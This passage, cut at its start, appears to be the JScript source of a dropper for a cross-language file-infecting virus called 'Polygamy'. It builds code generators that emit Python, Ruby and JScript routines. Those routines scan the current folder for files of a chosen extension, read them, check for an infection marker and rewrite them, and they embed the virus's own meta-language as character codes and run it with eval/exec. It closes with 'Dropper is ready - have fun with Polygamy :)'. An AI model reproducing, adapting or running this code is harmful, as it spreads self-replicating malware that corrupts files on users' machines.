translatorRuby+='                rString<<lineCode[1]<<"<<"<<34.chr<<lineCode[2]<<tmpVar[0..tmpVar.length-1-lineCode[4].length]<<lineCode[5]<<34.chr<<";"'+nl;
translatorRuby+='                rString<<lineCode[1]<<"<<13.chr<<10.chr;";'+nl;
translatorRuby+='            end'+nl;
translatorRuby+='        end'+nl;  
translatorRuby+='        i+=1'+nl;
translatorRuby+='    end'+nl;
translatorRuby+='    return(rString)'+nl;
translatorRuby+='end'+nl;
translatorRuby+='xx=metaLanguage.split("__");'+nl;
translatorRuby+='myCode=createBlockOfCode(xx,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython);'+nl;
translatorRuby+='eval(myCode)'+nl;

translatorPython='import os'+nl;
translatorPython+='def createBlockOfCode(CodeBlockArray,space):'+nl;
translatorPython+='    nl=chr(13)+chr(10)'+nl;
translatorPython+='    RString=""'+nl;
translatorPython+='    for i in range(len(CodeBlockArray)):'+nl;
translatorPython+='        LineCode=CodeBlockArray[i].split(" ")'+nl;
translatorPython+='        if LineCode[0]=="Forall":'+nl;
translatorPython+='            RString+=space+"a=os.listdir(os.curdir)"+nl'+nl;
translatorPython+='            RString+=space+"for i in range(len(a)):"+nl'+nl;
translatorPython+='            RString+=space+"  if a[i].find("+chr(34)+"."+LineCode[1]+chr(34)+")>0:"+nl'+nl;            
translatorPython+='            j=i+1'+nl;
translatorPython+='            NewBlock=[]'+nl;
translatorPython+='            while CodeBlockArray[j][0:2]=="  ":'+nl;
translatorPython+='                NewBlock.append(CodeBlockArray[j][2:len(CodeBlockArray[j])])'+nl;
translatorPython+='                j+=1'+nl;
translatorPython+=''+nl;
translatorPython+='            RString+=createBlockOfCode(NewBlock,space+"    ")+nl'+nl;
translatorPython+=''+nl;
translatorPython+='        if LineCode[0]=="If":'+nl;
translatorPython+='            RString+=space+"if "+LineCode[1]+LineCode[2]+LineCode[3]+":"+nl'+nl;     
translatorPython+='            j=i+1'+nl;
translatorPython+='            NewBlock=[]'+nl;
translatorPython+='            while CodeBlockArray[j][0:2]=="  ":'+nl;
translatorPython+='                NewBlock.append(CodeBlockArray[j][2:len(CodeBlockArray[j])])'+nl;
translatorPython+='                j+=1'+nl;
translatorPython+='            RString+=createBlockOfCode(NewBlock,space+"    ")+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="GetFileName":'+nl;
translatorPython+='            RString+=space+LineCode[1]+"=a[i]"+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="ReadAll":'+nl;
translatorPython+='            RString+=space+"h=open("+LineCode[2]+","+chr(34)+"r"+chr(34)+")"+nl'+nl;
translatorPython+='            RString+=space+LineCode[1]+"=h.read()"+nl'+nl;
translatorPython+='            RString+=space+"h.close()"+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="Exist":'+nl;
translatorPython+='            RString+=space+LineCode[1]+"="+LineCode[2]+".find("+LineCode[3]+")"+nl'+nl;
translatorPython+=''+nl;
translatorPython+='        if LineCode[0]=="Def":'+nl;
translatorPython+='            RString+=space+LineCode[1]+"="+chr(34)+chr(34)+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="Arithmetic":'+nl;
translatorPython+='            RString+=space+LineCode[1]+"="+LineCode[2]+LineCode[3]+LineCode[4]+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="Write":'+nl;
translatorPython+='            RString+=space+"h=open("+LineCode[1]+","+chr(34)+"w"+chr(34)+")"+nl'+nl;
translatorPython+='            RString+=space+"h.write("+LineCode[2]+")"+nl'+nl;
translatorPython+='            RString+=space+"h.close()"+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="AddString":'+nl;
translatorPython+='            RString+=space+LineCode[1]+"+="+chr(34)+LineCode[2]+chr(34)+nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="AddChar":'+nl;
translatorPython+='            RString+=space+LineCode[1]+"="+LineCode[1]'+nl;
translatorPython+='            j=2'+nl;
translatorPython+='            while j<len(LineCode):'+nl;
translatorPython+='                RString+="+chr("+LineCode[j]+")"'+nl;
translatorPython+='                j+=1'+nl;
translatorPython+='            RString+=nl'+nl;
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="AddML":'+nl;
translatorPython+='            RString+=space+"metaLanguage="+chr(34)+chr(34)+nl'+nl;
translatorPython+='            j=0'+nl;
translatorPython+='            while j<len(metaLanguage):'+nl;
translatorPython+='                count=min(1000,len(metaLanguage)-j)'+nl;
translatorPython+='                TmpVar=""'+nl;
translatorPython+='                for k in range(count):'+nl;
translatorPython+='                    TmpVar+=str(ord(metaLanguage[j]))+")+chr("'+nl;
translatorPython+='                    j+=1'+nl;
translatorPython+='                RString+=space+"metaLanguage+=chr("+TmpVar[0:len(TmpVar)-6]+")"+nl'+nl
translatorPython+=''+nl;            
translatorPython+='        if LineCode[0]=="AddStringAsChar":'+nl;
translatorPython+='            StringTrafo=eval(LineCode[3])'+nl;
translatorPython+='            j=0'+nl;
translatorPython+='            while j<len(StringTrafo):'+nl;
translatorPython+='                count=min(1000,len(StringTrafo)-j)'+nl;
translatorPython+='                TmpVar=""'+nl;
translatorPython+='                for k in range(count):'+nl;
translatorPython+='                    TmpVar+=str(ord(StringTrafo[j]))+LineCode[4]'+nl;
translatorPython+='                    j+=1'+nl;
translatorPython+='                RString+=space+LineCode[1]+"+="+chr(34)+LineCode[2]+TmpVar[0:len(TmpVar)-len(LineCode[4])]+LineCode[5]+chr(34)+"+chr(13)+chr(10)"+nl'+nl;
translatorPython+=''+nl;               
translatorPython+='    return(RString)'+nl;
translatorPython+=''+nl;        
translatorPython+='xx=metaLanguage.split("__")'+nl;
translatorPython+='MyCode=createBlockOfCode(xx,"")'+nl;
//translatorPython+='h=open("mycode.py","w");h.write(MyCode);h.close();'+nl;
translatorPython+='exec(MyCode)'+nl;



function createBlockOfCode(CodeBlockArray)
{
    var RString=''; 
    for(var i=0;i<CodeBlockArray.length;i++)
    {
        var LineCode=CodeBlockArray[i].split(String.fromCharCode(32));
        if(LineCode[0]=='Predefined')
        {
            RString+='fso=new ActiveXObject('+String.fromCharCode(34)+'scripting.filesystemobject'+String.fromCharCode(34)+');'+nl
        }
        
        if(LineCode[0]=='Forall')
        {
            var ext=LineCode[1];
            RString+='for(d=new Enumerator(fso.getfolder('+String.fromCharCode(34)+'.'+String.fromCharCode(34)+').files);!d.atEnd();d.moveNext()){'+nl;
            RString+='if(fso.getextensionname(d.item()).toLowerCase()=='+String.fromCharCode(34)+ext+String.fromCharCode(34)+'){'+nl;         
            var j=i+1;var NewBlock=[];
            while(CodeBlockArray[j].substring(0,2)=='  ')
            {
                NewBlock.push(CodeBlockArray[j].substring(2));j++;
            }
            RString+=createBlockOfCode(NewBlock);
            RString+='}}'+nl;
        }
        
        if(LineCode[0]=='If')
        {
            RString+='if('+LineCode[1]+LineCode[2]+LineCode[3]+'){'+nl;        
            var j=i+1;var NewBlock=[];
            while(CodeBlockArray[j].substring(0,2)=='  ')
            {
                NewBlock.push(CodeBlockArray[j].substring(2));j++;
            }          
            RString+=createBlockOfCode(NewBlock);
            RString+='}'+nl;
        }         
        
        if(LineCode[0]=='GetFileName')
        {
            RString+=LineCode[1]+'=d.item();'+nl;
        }
        
        if(LineCode[0]=='ReadAll')
        {
            RString+=LineCode[1]+'=fso.opentextfile('+LineCode[2]+').readall();'+nl;
        }
        
        if(LineCode[0]=='Exist')
        {
            RString+=LineCode[1]+'='+LineCode[2]+'.search('+LineCode[3]+');'+nl;
        }
        
        if(LineCode[0]=='Def')
        {
            RString+=LineCode[1]+'='+String.fromCharCode(34,34)+';'+nl;
        }     
        
        if(LineCode[0]=='Arithmetic')
        {
            RString+=LineCode[1]+'='+LineCode[2]+LineCode[3]+LineCode[4]+nl;
        }    
        
        if(LineCode[0]=='Write')
        {
            RString+='fso.opentextfile('+LineCode[1]+',2).write('+LineCode[2]+');'+nl;
        }  
        
        if(LineCode[0]=='AddString')
        {
            RString+=LineCode[1]+'+='+String.fromCharCode(34)+LineCode[2]+String.fromCharCode(34)+';'+nl;
        }  
        
        if(LineCode[0]=='AddChar')
        {
            RString+=LineCode[1]+'='+LineCode[1];
            for(var j=2; j<LineCode.length; j++)
            {
                RString+='+String.fromCharCode('+LineCode[j]+')'
            }
            RString+=';'
        }
        
        if(LineCode[0]=='AddML')
        {
            RString+='metaLanguage=String.fromCharCode(';
            for(j=0;j<metaLanguage.length;j++)
            {
                RString+=metaLanguage.charCodeAt(j)+',';                
            }
            RString+='13,10);'+nl;
        }
                       
        if(LineCode[0]=='AddStringAsChar')
        {
            var StringTrafo=eval(LineCode[3]);
            j=0;
            while (j<StringTrafo.length)
            {
                count=1000;
                var TmpVar='';
                if(StringTrafo.length-j<1000){count=StringTrafo.length-j;}
                for(k=0;k<count;k++)
                {
                    TmpVar+=StringTrafo.charCodeAt(j)+LineCode[4];
                    j++;
                }  
                RString+=LineCode[1]+'+="'+LineCode[2]+TmpVar.substr(0,TmpVar.length-LineCode[4].length)+LineCode[5]+'"'+nl;            
                RString+=LineCode[1]+'+=String.fromCharCode(13,10);';
            }
        }
    }
    return(RString)
}

translatorJS=createBlockOfCode;
translatorJS+='nl=String.fromCharCode(13,10);';
translatorJS+='xx=metaLanguage.split("__");';
translatorJS+='MyCode=createBlockOfCode(xx);';
//translatorJS+='fso=WScript.CreateObject("Scripting.FileSystemObject");';
//translatorJS+='file=fso.CreateTextFile("xxx.txt");file.Write(MyCode);file.close();';
translatorJS+='eval(MyCode);';

for(i=0;i<50;i++) // Making the translators smaller by removing some whitespace, not possible with Python
{
    translatorJS=translatorJS.replace("   ","");
    translatorVBS=translatorVBS.replace("   ","");
    translatorMatLab=translatorMatLab.replace("   ","");
    translatorRuby=translatorRuby.replace("   ","");
}
//fso=WScript.CreateObject("Scripting.FileSystemObject");file=fso.CreateTextFile("111.txt");file.Write(translatorJS);file.close();
           
eval(translatorJS)
WScript.Echo("Dropper is ready - have fun with Polygamy :)")